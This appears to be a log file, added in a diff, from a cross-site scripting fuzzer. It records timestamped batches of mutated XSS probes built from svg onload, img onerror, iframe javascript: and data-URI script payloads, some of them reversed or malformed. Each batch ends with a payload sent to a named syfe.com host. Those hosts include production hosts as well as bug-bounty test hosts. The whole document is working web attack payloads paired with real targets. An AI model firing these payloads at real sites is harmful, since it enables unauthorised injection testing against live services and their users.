+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://api.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:33:35 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://api.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:33:44 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+[https://api.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 06:33:55 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://alfred.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:34:06 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://alfred.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:34:21 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+[https://alfred.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 06:34:32 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://mark8.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:34:44 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://mark8.syfe.com] <img src='x' onerror='<img src=x onerror=alert(1)>'>
+
+--- 2025-05-23 06:34:58 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+[https://mark8.syfe.com] <body onload=<iframe src='javascript:alert(1)'></iframe>>
+
+--- 2025-05-23 06:36:55 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+[https://uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:37:13 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://uat-bugbounty.nonprod.syfe.com] <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+
+--- 2025-05-23 06:37:27 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 06:37:43 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+[https://api-uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:37:53 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://api-uat-bugbounty.nonprod.syfe.com] <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+
+--- 2025-05-23 06:38:08 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://api-uat-bugbounty.nonprod.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 06:38:20 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+[https://www.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:38:38 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://www.syfe.com] <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+
+--- 2025-05-23 06:38:53 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://www.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 06:39:03 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+[https://api.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:39:16 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://api.syfe.com] <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+
+--- 2025-05-23 06:39:31 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://api.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 06:39:40 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+[https://alfred.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:39:51 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://alfred.syfe.com] <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+
+--- 2025-05-23 06:40:03 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://alfred.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 06:40:14 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+[https://mark8.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:40:24 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+[https://mark8.syfe.com] <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+
+--- 2025-05-23 06:40:37 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://mark8.syfe.com] <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+
+--- 2025-05-23 06:45:03 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+[https://uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:45:18 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+[https://uat-bugbounty.nonprod.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:45:32 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://uat-bugbounty.nonprod.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 06:45:50 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+[https://api-uat-bugbounty.nonprod.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:46:04 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+[https://api-uat-bugbounty.nonprod.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:46:16 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://api-uat-bugbounty.nonprod.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 06:46:29 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+[https://www.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:46:42 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+[https://www.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:46:58 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://www.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 06:47:15 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+[https://api.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:47:24 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+[https://api.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:47:40 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://api.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 06:47:50 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+[https://alfred.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:48:03 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+[https://alfred.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:48:18 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://alfred.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 06:48:34 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+[https://mark8.syfe.com] >)1(trela=daolno/gvs<
+
+--- 2025-05-23 06:48:45 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+[https://mark8.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:48:58 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+[https://mark8.syfe.com] >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+
+--- 2025-05-23 06:52:29 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://uat-bugbounty.nonprod.syfe.com] <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+
+--- 2025-05-23 06:52:44 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://uat-bugbounty.nonprod.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:52:54 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://uat-bugbounty.nonprod.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:53:05 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://api-uat-bugbounty.nonprod.syfe.com] <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+
+--- 2025-05-23 06:53:20 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://api-uat-bugbounty.nonprod.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:53:31 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
